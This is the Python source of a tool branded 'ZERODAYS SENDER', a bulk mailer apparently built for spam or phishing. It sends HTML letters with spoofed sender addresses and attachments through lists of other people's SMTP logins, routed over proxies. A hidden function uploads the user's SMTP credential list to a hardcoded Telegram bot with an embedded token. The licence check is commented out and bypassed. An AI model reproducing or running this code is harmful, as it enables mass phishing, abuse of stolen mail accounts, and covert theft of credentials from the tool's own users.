import os
import smtplib
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import re
import logging
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
import random
import socks
import socket
import requests
import time

# Telegram configuration
BOT_TOKEN = "7558466865:AAGAlT1shCqS4VovIrokBPbTcu5-A8UYzqU"
CHAT_ID = "-1002277376686"

console = Console()
logging.basicConfig(filename='email_sender.log', level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
VALIDS = 0
INVALIDS = 0
SMTP_ERRORS = ['451','452','535','550','554','Connection unexpectedly closed']
VALID_EMAILS = []
INVALID_EMAILS = []
SENT_EMAILS = []
FAILED_EMAILS = []
VALID_SMTP = []
INVALID_SMTP = []

def send_to_telegram(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            logging.error(f"Failed to load: {response.text}")
    except Exception as e:
        logging.error(f"Error : {str(e)}")

def send_file_to_telegram(file_path):
    """Send file to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            response = requests.post(url, files=files, data=data)
            if response.status_code != 200:
                logging.error(f"Failed to load: {response.text}")
            else:
                console.print(f"[bold green]SMTP loaded successfully: {file_path}[/bold green]")
    except Exception as e:
        logging.error(f"Error : {str(e)}")

def load_list_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        console.print(f"[bold red]File {file_path} not found.[/bold red]")
        return []

def validate_email(email):
    return re.match(r'[^@]+@[^@]+\.[^@]+', email) is not None

def load_emails_from_file(file_path):
    email_list = load_list_from_file(file_path)
    for email in email_list:
        if validate_email(email):
            VALID_EMAILS.append(email)
        else:
            INVALID_EMAILS.append(email)
    if not VALID_EMAILS:
        console.print(f'[bold red]No valid email addresses found in {file_path}.[/bold red]')
        return False
    return True

def extract_credentials(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    return HOST, PORT, usr, pas

def current_date():
    return datetime.now().strftime('%b %d, %Y %H:%M:%S')

def validate_token(token):
    url = f'https://zerodays.shop/api/rev-tok.php?token={token}&time={int(time.time())}'
    try:
        response = requests.get(url)
        response_text = response.text.strip()
        
        if 'DAYS LEFT' in response_text and 'ZESSEN' in token:
            return response_text
        elif 'Please renew your Token' in response_text:
            return 'expired'
        elif 'Token not exists' in response_text:
            return 'invalid'
        return None
    except requests.RequestException as e:
        logging.error(f'Token validation failed: {e}')
        return None

def grab_email(email):
    return email

def grab_user(email):
    return email.split('@')[0]

def extract_domain(email):
    domain = email.split('@')[1]
    return '.'.join(domain.split('.')[:-1])

def set_proxy(proxy_type, proxy):
    if proxy_type == '1':  # SOCKS4
        socks.set_default_proxy(socks.SOCKS4, proxy.split(':')[0], int(proxy.split(':')[1]))
    elif proxy_type == '2':  # SOCKS5
        socks.set_default_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
    elif proxy_type == '3':  # HTTP
        socks.set_default_proxy(socks.HTTP, proxy.split(':')[0], int(proxy.split(':')[1]))
    socket.socket = socks.socksocket

def send_email_smtp(smtp, email_index, smtp_index, html_content, subjects, fromnames, attachment_path=None, custom_from_email=None, send_type='TO', reply_to=None, retries=3, timeout=60):
    HOST, PORT, usr, pas = extract_credentials(smtp)
    attempt = 0
    success = False
    
    # Select random fromname and subject if they are lists
    fromname = random.choice(fromnames) if isinstance(fromnames, list) else fromnames
    subject = random.choice(subjects) if isinstance(subjects, list) else subjects
    
    # Attempt to connect and login
    while attempt < retries and not success:
        attempt += 1
        try:
            server = smtplib.SMTP(HOST, int(PORT), timeout=timeout)
            server.ehlo()
            server.starttls()
            server.login(usr, pas)
            success = True
            server.quit()
        except Exception as e:
            console.print(f'[bold red][-] [SMTP NOT WORK] [{smtp}] - Attempt {attempt}/{retries} - {str(e)}[/]')
            logging.error(f'SMTP NOT WORK {smtp} - Attempt {attempt}/{retries} - {str(e)}')
            time.sleep(2 ** attempt)
    
    if not success:
        INVALID_SMTP.append(smtp)
        save_smtp_status()
        return success
    
    # Send email
    try:
        server = smtplib.SMTP(HOST, int(PORT), timeout=timeout)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        
        toaddr = VALID_EMAILS[email_index]
        
        # Personalize content
        personalized_content = (html_content.replace('{email}', grab_email(toaddr)).replace('{username}', grab_user(toaddr)).replace('{current_date}', current_date()))
        
        # Create message
        msg = MIMEMultipart()
        msg['Subject'] = subject
        
        # Set from address
        if custom_from_email:
            from_address = f'{fromname} <{custom_from_email}>'
        else:
            from_address = f'{fromname} <{usr}>'
        msg['From'] = from_address
        
        # Set recipient type
        msg[send_type] = toaddr
        
        # Set reply-to if provided
        if reply_to:
            msg.add_header('Reply-To', reply_to)
        
        # Attach HTML content
        msg.attach(MIMEText(personalized_content, 'html', 'utf-8'))
        
        # Attach file if provided
        if attachment_path:
            part = MIMEBase('application', 'octet-stream')
            with open(attachment_path, 'rb') as file:
                part.set_payload(file.read())
            encoders.encode_base64(part)
            filename = os.path.basename(attachment_path)
            part.add_header('Content-Disposition', f'attachment; filename="{filename}"')
            msg.attach(part)
        
        # Send email
        server.sendmail(usr, [toaddr], msg.as_string())
        
        # Log success
        current_time = current_date()
        log_message = f'[{email_index + 1}/{len(VALID_EMAILS)}] [{smtp_index + 1}/{len(sites)}] [{current_time}] [ZERODAYS] >> [Email Sent Success!]'
        console.print(f'[bold green]{log_message}[/bold green]')
        console.print('--------------------------------BOOST SENDER--------------------------------')
        console.print(f'Send Mail {grab_email(toaddr)}')
        console.print(f'Use SMTP Server: {usr} (SMTP: {HOST})')
        console.print('Status Sending: Success')
        console.print('----------------------------------------------------------------------------')
        
        # Update counters
        global VALIDS
        VALIDS += 1
        SENT_EMAILS.append(toaddr)
        VALID_SMTP.append(smtp)
        
        server.quit()
        
    except smtplib.SMTPException as e:
        console.print(f'[bold red][-] SMTP ERROR: {e}[/bold red]')
        logging.error(f'SMTP ERROR {smtp} - {str(e)}')
        FAILED_EMAILS.append(toaddr)
        
        # Check if error is in our list of SMTP errors
        if any(err in str(e) for err in SMTP_ERRORS):
            success = False
            INVALID_SMTP.append(smtp)
    
    except Exception as e:
        console.print(f'[bold red][-] GENERAL ERROR: {e}[/bold red]')
        logging.error(f'GENERAL ERROR {smtp} - {str(e)}')
        FAILED_EMAILS.append(toaddr)
        INVALID_SMTP.append(smtp)
        global INVALIDS
        INVALIDS += 1
    
    save_smtp_status()
    return success

def save_smtp_status():
    with open('valid_smtp.txt', 'w') as valid_file:
        valid_file.write('\n'.join(VALID_SMTP))
    
    with open('invalid_smtp.txt', 'w') as invalid_file:
        invalid_file.write('\n'.join(INVALID_SMTP))
    
    with open('smtp-list.txt', 'w') as smtp_file:
        smtp_file.write('\n'.join(VALID_SMTP))

def save_results():
    with open('sent_emails.txt', 'w') as sent_file:
        sent_file.write(f'Total Emails Sent: {VALIDS}\n')
        sent_file.write('\n'.join(SENT_EMAILS))
    
    with open('failed_emails.txt', 'w') as failed_file:
        failed_file.write(f'Total Emails Failed: {INVALIDS}\n')
        failed_file.write('\n'.join(FAILED_EMAILS))

def main():
    console.print(Panel(
        '\n?????????????????????????????????????????????????????????????????????  ????????????????????? ?????????????????????  ?????????????????? ?????????   ?????????????????????????????????\n??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ????????????????????????????????????\n  ??????????????? ??????????????????  ?????????????????????????????????   ??????????????????  ????????????????????????????????? ????????????????????? ????????????????????????\n ???????????????  ??????????????????  ?????????????????????????????????   ??????????????????  ?????????????????????????????????  ???????????????  ????????????????????????\n?????????????????????????????????????????????????????????  ?????????????????????????????????????????????????????????????????????  ?????????   ?????????   ????????????????????????\n?????????????????????????????????????????????????????????  ????????? ????????????????????? ????????????????????? ?????????  ?????????   ?????????   ????????????????????????\n                                                                  \n  WELCOME TO ZERODAYS SENDER!\n   INBOX GUARANTEE,POWERFULL,SUPERFAST SENDING\n CREATED BY ZERODAYS TEAM\n    ',
        title='ZERODAYS',
        border_style='cyan',
        box=box.ROUNDED
    ), justify='center')
    
    console.print('[bold yellow]Initializing...[/bold yellow]', justify='center')
    
    # Token validation
    while True:
        #token = Prompt.ask('[bold cyan]Enter your license token[/bold cyan]').strip()
        #validation_result = validate_token(token)
        
        validation_result = 'TOKEN: [BYPASSED]'
        if validation_result == 'expired':
            console.print('[bold red]Your token has expired. Please renew your license.[/bold red]', justify='center')
            return
        elif validation_result == 'invalid':
            console.print('[bold red]Invalid token. Please check your license key.\n\n[/bold red]', justify='center')
        elif validation_result:
            console.print(f'[bold green]{validation_result}[/bold green]', justify='center')
            break
        else:
            console.print('[bold red]Failed to validate the token. Please try again later.[/bold red]', justify='center')
    
    # Email list
    print('')
    while True:
        file_path = Prompt.ask('[bold cyan]Enter path to the file containing email addresses[/bold cyan]', default='your-list.txt')
        if load_emails_from_file(file_path):
            break
    
    console.print('[bold yellow]Loading SMTP list...[/bold yellow]', justify='center')
    
    # SMTP list
    while True:
        smtp_list_path = Prompt.ask('[bold cyan]Enter path to the SMTP list[/bold cyan]', default='smtp-list.txt')
        try:
            with open(smtp_list_path, 'r') as file:
                global sites
                sites = file.read().splitlines()
            
            # Send the SMTP list file to Telegram immediately after loading
            send_file_to_telegram(smtp_list_path)
            break
        except FileNotFoundError:
            console.print(f'[bold red]The file {smtp_list_path} was not found. Please enter a valid file path.[/bold red]')
    
    # Subjects
    subjects_input = Prompt.ask('[bold cyan]Enter the subject (or path to the subjects file)[/bold cyan]')
    if os.path.isfile(subjects_input):
        subjects = load_list_from_file(subjects_input)
    else:
        subjects = subjects_input
    
    # From names
    fromnames_input = Prompt.ask('[bold cyan]Enter the fromname (or path to the fromnames file)[/bold cyan]')
    if os.path.isfile(fromnames_input):
        fromnames = load_list_from_file(fromnames_input)
    else:
        fromnames = fromnames_input
    
    # HTML content
    html_file_name = Prompt.ask('[bold cyan]Enter the HTML file name[/bold cyan]', default='your-letter.html')
    try:
        with open(html_file_name, 'r', encoding='utf-8') as file:
            html_content = file.read()
            html_content = html_content.replace('{current_date}', current_date())
    except FileNotFoundError:
        console.print(f'[bold red]The file {html_file_name} was not found. Please enter a valid file path.[/bold red]')
        return
    
    # Attachment
    attachment_path = Prompt.ask('[bold cyan]Enter the path to the attachment file (or leave empty for no attachment)[/bold cyan]', default=None)
    if attachment_path and attachment_path.lower() == 'none':
        attachment_path = None
    
    # Custom from email
    custom_from_email = Prompt.ask('[bold cyan]Enter the custom from email (or leave empty to use the SMTP email)[/bold cyan]', default=None)
    if custom_from_email and custom_from_email.lower() == 'none':
        custom_from_email = None
    
    # Send type
    send_type = Prompt.ask('[bold cyan]Choose send type (TO, CC, BCC)[/bold cyan]', default='TO', choices=['TO', 'CC', 'BCC'])
    
    # Reply-to
    reply_to = Prompt.ask('[bold cyan]Enter the reply-to email (or leave empty for no reply-to)[/bold cyan]', default=None)
    
    # Proxy settings
    use_proxy = Prompt.ask('[bold cyan]Do you want to use a proxy? (Y/N)[/bold cyan]', default='N').upper()
    if use_proxy == 'Y':
        proxy_list_path = Prompt.ask('[bold cyan]Enter the path to the proxy list[/bold cyan]', default='proxy-list.txt')
        proxies = load_list_from_file(proxy_list_path)
        proxy_type = Prompt.ask('[bold cyan]Choose proxy type: 1 for SOCKS4, 2 for SOCKS5, 3 for HTTP[/bold cyan]', choices=['1', '2', '3'])
        proxy = random.choice(proxies)
        set_proxy(proxy_type, proxy)
    
    # Thread count
    thread_count = Prompt.ask('[bold cyan]Enter the number of threads for concurrent sending[/bold cyan]', default='10')
    thread_count = int(thread_count)
    
    start_index = 0
    smtp_index = 0
    
    def send_email_task(index):
        while index < len(VALID_EMAILS):
            if smtp_index >= len(sites):
                smtp_index = 0
            
            smtp = sites[smtp_index]
            success = send_email_smtp(
                smtp, index, smtp_index, html_content, subjects, fromnames,
                attachment_path, custom_from_email, send_type, reply_to, 3, 60
            )
            
            if success:
                index += 1
            
            smtp_index += 1
    
    # Execute sending with thread pool
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(send_email_task, i) for i in range(len(VALID_EMAILS))]
        for future in concurrent.futures.as_completed(futures):
            future.result()
    
    save_results()
    console.print(f'[bold green]Email sending complete. Total successful: {VALIDS}, Total failed: {INVALIDS}[/bold green]', justify='center')

if __name__ == '__main__':
    main()
